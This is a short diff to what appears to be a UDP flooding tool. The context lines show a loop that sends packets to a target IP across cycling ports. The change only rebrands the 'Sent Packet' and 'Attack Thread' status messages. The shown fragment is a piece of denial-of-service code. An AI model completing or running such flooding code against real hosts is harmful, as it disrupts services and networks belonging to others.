@@ -84,7 +84,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print(f"\033[97m[⚠️\033[99mK1L45-B4L1K\033[97m]   Sent  \033[94mPacket:::.... " +ip+ "\033[0m" )
-     print(f"\033[93m[⚠️\033[99m+\033[93m]   Attack  \033[95mThread:::.... " +ip+ "\033[0m" )
+     print(f"\033[97m[💥\033[99m KILAZ-BALIK\033[97m]   Sent  \033[94mPacket:::.... " +ip+ "\033[0m" )
+     print(f"\033[93m[💥\033[99m KILAZ-BALIK\033[93m]   Attack  \033[95mThread:::.... " +ip+ "\033[0m" )
      if port == 65534:
        port = 1
